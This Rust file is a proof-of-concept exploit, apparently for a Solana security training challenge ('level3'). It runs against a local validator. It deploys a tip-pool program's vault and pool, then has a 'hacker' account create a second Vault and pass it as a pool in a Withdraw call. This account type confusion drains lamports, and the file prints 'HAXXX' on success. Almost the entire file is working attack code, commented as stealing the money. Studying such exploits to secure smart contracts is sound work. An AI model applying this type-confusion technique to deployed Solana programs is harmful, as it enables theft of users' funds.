use owo_colors::OwoColorize;
use poc_framework::solana_program::pubkey::Pubkey;
use poc_framework::{keypair, RemoteEnvironment,};
use poc_framework::solana_sdk::system_program;
use poc_framework::solana_program::instruction::{AccountMeta, Instruction};
use poc_framework::solana_sdk::{
    signature::{read_keypair_file, Signer},
};

use poc_framework::Environment;
use poc_framework::localhost_client;

use borsh::{BorshSerialize, BorshDeserialize};
#[derive(Debug, BorshDeserialize, BorshSerialize)]
pub enum TipInstruction {
    Initialize {
        seed: u8,
        fee: f64,
        fee_recipient: Pubkey,
    },
    CreatePool,
    Tip { amount: u64 },
    Withdraw { amount: u64 },
}
// We use the same Structure created in the Smart Contract
#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct TipPool {
    pub withdraw_authority: Pubkey,
    pub value: u64,
    pub vault: Pubkey,
}

pub const TIP_POOL_LEN: u64 = 32 + 8 + 32;

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct Vault {
    pub creator: Pubkey,
    pub fee: f64,              //reserved for future use
    pub fee_recipient: Pubkey, //reserved for future use
    pub seed: u8,
}
pub const VAULT_LEN: u64 = 32 + 8 + 32 + 1;

pub fn main() {
    let programa_keypair = read_keypair_file("./target/so/level3-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();
    let cliente1 = localhost_client();
    
    let hacker = keypair(1);
    let withdraw_authority = keypair(2);
    let pool_info = keypair(3);
    let authority_info = keypair(4);
    let tip_guy = keypair(5);

    /* Create the PDA */
    let seed:u8 = 1;
    let vault_info = Pubkey::create_program_address(&[&[seed]], &programa).unwrap();
 
    let mut env = RemoteEnvironment::new_with_airdrop(cliente1, keypair(4), 10000000000);
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(vault_info, false),
                        AccountMeta::new(authority_info.pubkey(), true),
                        AccountMeta::new_readonly(poc_framework::solana_program::sysvar::rent::id(), false),
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: TipInstruction::Initialize {
                            //creator : authority_info.pubkey(),
                            fee : 1000f64,
                            fee_recipient : authority_info.pubkey(),
                            seed: seed
                         }.try_to_vec().unwrap(), 
                        }],
                        &[&authority_info],
                    );
            let vault_address_info = env.get_account(vault_info).unwrap();
            let auth_vault_address_info = env.get_account(authority_info.pubkey()).unwrap();

            println!("");
            println!("{}", "********************************************".bright_blue().bold());
            println!("{}", "*                 INITIALIZING             *".bright_blue().bold());
            println!("{}", "********************************************".bright_blue().bold());
            println!("");
            println!("{} {:?} {} {:?}", 
            "Vault info address: ".bold().blue(), vault_info, " Vault info data: "
            , vault_address_info.blue());
            println!("");
            println!("{} {:?}", "Auth info address: ".bold().blue(), auth_vault_address_info.blue());
            println!("");
            println!("{} {:?}", "Vault info deserialized data,  : ".bold().green(), 
            env.get_deserialized_account::<Vault>(vault_info).unwrap().green());
            println!("");
            println!("");
            println!("");   

         
            env.airdrop(withdraw_authority.pubkey(), 100000000000);
            env.create_account_rent_excempt(&pool_info, TIP_POOL_LEN as usize, programa);
            println!("Pool info: {:?}", env.get_account(pool_info.pubkey()).unwrap().green());
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(vault_info, false), 
                        AccountMeta::new(withdraw_authority.pubkey(), true), 
                        AccountMeta::new(pool_info.pubkey(), false), 
                        ],
                        data: TipInstruction::CreatePool.try_to_vec().unwrap(),
                    }],
                        &[&withdraw_authority],
                    );

            let withdraw_address_info = env.get_account(withdraw_authority.pubkey()).unwrap();

            let pool_address_deser = env.get_deserialized_account::<TipPool>(pool_info.pubkey()).unwrap();
            println!("");
            println!("{}", "********************************************".bright_blue().bold());
            println!("{}", "*               CREATING POOL              *".bright_blue().bold());
            println!("{}", "********************************************".bright_blue().bold());
            println!("");
            println!("Vault info addr is: {:?}, and deser data is: {:?}", vault_info, 
            env.get_deserialized_account::<Vault>(vault_info).unwrap().green());
            println!("");
            println!("withdraw_address_info is: {:?}", withdraw_address_info);
            println!("");
            println!("Pool addr is: {:?}, and the data deser is: {:?}"
            , pool_info.pubkey().green(), pool_address_deser.green());
            println!("");


               /* Third we steal the money */

            env.airdrop(tip_guy.pubkey(), 100000000000);

            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(vault_info, false), 
                        AccountMeta::new(pool_info.pubkey(), false), 
                        AccountMeta::new(tip_guy.pubkey(), true),  
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: TipInstruction::Tip { amount: 10000 }.try_to_vec().unwrap(),
                    }],
                        &[&tip_guy],
                    );

            let tip_address_info = env.get_account(tip_guy.pubkey()).unwrap();

            println!("");
            println!("{}", "********************************************".bright_blue().bold());
            println!("{}", "*                    TIP                   *".bright_blue().bold());
            println!("{}", "********************************************".bright_blue().bold());
            println!("");
            println!("Vault info addr is: {:?}, and deser data is: {:?}", vault_info, 
            env.get_deserialized_account::<Vault>(vault_info).unwrap().green());
            println!("");
            println!("Tip Guy addr info is: {:?}", tip_address_info);
            println!("");
            println!("Pool addr is: {:?}, and the data deser is: {:?}"
            , pool_info.pubkey().green(), env.get_deserialized_account::<TipPool>(pool_info.pubkey()).unwrap().green());
            println!("");


            /* Widthdraw */
            println!("");
            println!("{}", "********************************************".bright_blue().bold());
            println!("{}", "*       WITHDRAWING - TYPE CONFUSION       *".bright_blue().bold());
            println!("{}", "********************************************".bright_blue().bold());
            println!("");

            env.airdrop(hacker.pubkey(), 100000000000);

            let seed2:u8 = 11;
            let hacker_vault = Pubkey::create_program_address(&[&[seed2]], &programa).unwrap();

            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(hacker_vault, false),
                        AccountMeta::new(hacker.pubkey(), true),
                        AccountMeta::new_readonly(poc_framework::solana_program::sysvar::rent::id(), false),
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: TipInstruction::Initialize {
                            //creator : authority_info.pubkey(),
                            fee : 10000f64,
                            fee_recipient : vault_info,
                            seed: seed2
                         }.try_to_vec().unwrap(), 
                        }],
                        &[&hacker],
                    );


            println!("{} {:?} {} {:?}", "Hacker hacker_vault: ".green().bold(), 
            hacker_vault.yellow(), "data: ".green(), env.get_account(hacker_vault).unwrap().yellow());
            println!("{} {:?}", "Hacker vec :".green().bold(), 
            env.get_deserialized_account::<Vault>(hacker_vault).unwrap().yellow());
            
            let vault_before = env.get_account(vault_info).unwrap().lamports;
            let hacker_before = env.get_account(hacker.pubkey()).unwrap().lamports;

            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(vault_info, false),
                        AccountMeta::new(hacker_vault, false),
                        AccountMeta::new(hacker.pubkey(), true),
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: TipInstruction::Withdraw { amount: 10000 }.try_to_vec().unwrap(),
                    }],
                        &[&hacker],
                    );

            println!("");

            let vault_after = env.get_account(vault_info).unwrap().lamports;
     
            let hacker_after = env.get_account(hacker.pubkey()).unwrap().lamports;
     
            println!("");

            if vault_after < vault_before && hacker_after > hacker_before {
                println!("{}", "HAXXX".green().underline())
            } else { println!("SOME ERROR");}

            println!("");
            println!("{}  {:?}", "vault_info before:".bold().yellow()
            , vault_before.yellow().underline());
            println!("{} {:?}", "vault_info after: ".bold().green()
            , vault_after.green().underline());
            println!("");
            println!("{} {:?}", "hacker_before before: ".bold().yellow()
            , hacker_before.yellow().underline());
            println!("{} {:?}", "hacker_info after: ".bold().green()
            , hacker_after.green().underline());

    }